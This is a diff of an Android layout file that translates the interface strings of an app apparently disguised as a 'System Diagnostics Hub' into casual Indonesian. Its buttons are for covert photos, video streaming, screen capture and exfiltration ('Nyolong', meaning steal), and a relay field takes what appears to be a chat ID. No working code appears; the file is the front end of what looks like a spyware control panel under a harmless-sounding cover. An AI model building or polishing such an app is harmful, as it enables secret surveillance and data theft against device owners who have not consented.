@@ -13,7 +13,7 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="System Diagnostics Hub"
+            android:text="Pusat Diagnosa Sistem"
             android:textColor="#FFFFFF"
             android:textSize="24sp"
             android:textStyle="bold"
@@ -22,7 +22,7 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Version 1.2.0 | Status: Optimal"
+            android:text="Versi 1.2.0 | Status: Gacor Banget"
             android:textColor="#4CAF50"
             android:textSize="12sp"
             android:layout_marginBottom="24dp"/>
@@ -31,7 +31,7 @@
             android:id="@+id/etChatId"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:hint="Telemetry Relay Address"
+            android:hint="Alamat Relay Telemetry"
             android:textColorHint="#888888"
             android:textColor="#FFFFFF"
             android:inputType="number"
@@ -43,14 +43,14 @@
             android:id="@+id/btnStartUpdate"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Sync Core Modules"
+            android:text="Sinkron Modul Inti"
             android:layout_marginBottom="24dp"
             android:backgroundTint="#2E7D32"/>
 
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="High-Value Visual Recon"
+            android:text="Kontrol Rekam Visual Pro"
             android:textColor="#BBBBBB"
             android:textSize="14sp"
             android:textStyle="bold"
@@ -68,7 +68,7 @@
                 android:layout_width="0dp"
                 android:layout_height="wrap_content"
                 android:layout_weight="1"
-                android:text="Covert Photo"
+                android:text="Foto Diem-Diem"
                 android:layout_marginEnd="4dp"
                 android:backgroundTint="#E91E63"/>
 
@@ -77,7 +77,7 @@
                 android:layout_width="0dp"
                 android:layout_height="wrap_content"
                 android:layout_weight="1"
-                android:text="Stream Video"
+                android:text="Rekam Video"
                 android:layout_marginStart="4dp"
                 android:backgroundTint="#FF9800"/>
         </LinearLayout>
@@ -86,14 +86,14 @@
             android:id="@+id/btnScreenshot"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Screen Intelligence"
+            android:text="Intip Layar HP"
             android:layout_marginBottom="16dp"
             android:backgroundTint="#1565C0"/>
 
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Support and Utility"
+            android:text="Bantuan dan Utilitas"
             android:textColor="#BBBBBB"
             android:textSize="14sp"
             android:textStyle="bold"
@@ -129,7 +129,7 @@
                 android:layout_width="0dp"
                 android:layout_height="wrap_content"
                 android:layout_weight="1"
-                android:text="Exfil"
+                android:text="Nyolong"
                 android:layout_marginStart="2dp"
                 android:backgroundTint="#C62828"/>
         </LinearLayout>
@@ -137,7 +137,7 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Synchronization Log"
+            android:text="Log Sinkronisasi"
             android:textColor="#BBBBBB"
             android:textSize="14sp"
             android:textStyle="bold"
@@ -151,7 +151,7 @@
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="Buffers optimized. Core active."
+                android:text="Buffer optimal. Inti gacor."
                 android:textColor="#444444"
                 android:layout_gravity="center"/>
         </FrameLayout>
@@ -160,7 +160,7 @@
             android:id="@+id/btnSettings"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="System Access Configuration"
+            android:text="Konfigurasi Akses Sistem"
             style="@style/Widget.MaterialComponents.Button.TextButton"
             android:textColor="#90CAF9"/>
 
